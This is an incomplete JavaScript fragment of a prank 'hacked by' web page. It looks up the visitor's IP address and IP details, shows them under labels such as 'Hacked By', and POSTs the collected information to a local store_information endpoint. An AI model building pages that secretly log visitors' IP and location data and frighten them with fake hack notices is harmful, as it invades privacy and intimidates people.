window.onload = async () => {
  ...
  try {
    ...
    const push = (key, value, additional) => {
      displayedInfo[key] = {
        value: value,
    ...
    let my_ip = await (
      await fetch("https://wtfismyip.com/json").catch(error)
    ).json();
    let ip_data = await (
      await fetch(
    ...
    video.oncanplaythrough = async () => {
      ...
      push("Hacked By", "Unknow K");
      push("Current Status", "🟢");
    };

    start.onclick = async () => {
      // Send the displayed information to the server when needed
      const options = {
        method: "POST",
      ...
      fetch("http://127.0.0.1:8000/store_information", options)
      ...
      const interval = setInterval(async () => {
        ...
        if (step >= Object.keys(displayedInfo).length) step = -Infinity;
        if (step < 0) return clearInterval(interval);
        if (time >= 0) {
          if (step == 0)
            document.title = `Hacked by Dab dab dab dab[${
              my_ip ? my_ip.YourFuckingIPAddress : "::ffff:172.70.126.134"
            }]`;
          const el = document.createElement("span");
          const key = Object.keys(displayedInfo)[step];
          el.textContent = `${key}: ${displayedInfo[key].value}${displayedInfo[key].additional}`;
          step++;
          data.appendChild(el);
